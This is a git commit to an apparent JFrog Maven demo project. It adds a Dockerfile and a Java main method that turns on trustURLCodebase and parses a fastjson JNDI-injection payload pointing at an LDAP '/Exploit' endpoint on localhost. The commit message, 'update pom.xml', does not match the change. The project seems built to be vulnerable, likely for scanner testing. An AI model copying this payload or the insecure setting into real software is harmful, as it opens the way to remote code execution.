8236fc42c2e363d04d21babf3d3be3c3e4ed8922
slash-l <slash_mumu@163.com>
2023-06-16 13:12:53 +0800

    update pom.xml

---
+++ Dockerfile
@@ -0,0 +1,2 @@
+FROM hello-world:latest
+COPY target/app-simple-maven-0.1.2-SNAPSHOT.jar /home/app/app-simple-maven-1.0-SNAPSHOT.jar
--- src/main/java/com/jfrog/maven/AppSimple.java
+++ src/main/java/com/jfrog/maven/AppSimple.java
@@ -1,5 +1,7 @@
 package com.jfrog.maven;
 
+import com.alibaba.fastjson.JSON;
+
 /**
  * Hello world!
  */
@@ -7,5 +9,15 @@ public class AppSimple {
     public static void main(String[] args) {
         new AppSimple();
         System.out.println("Hello World!");
+
+        System.out.println("Hello JFrog artifactory！");
+
+        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
+//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
+        String payload = "{\"@type\":\"org.apache.shiro.jndi.JndiObjectFactory\",\"resourceName\":\"ldap://127.0.0.1:1389/Exploit\"}";
+
+        JSON jsonObject = JSON.parseObject(payload);
+
+        System.out.println(jsonObject);
     }
 }
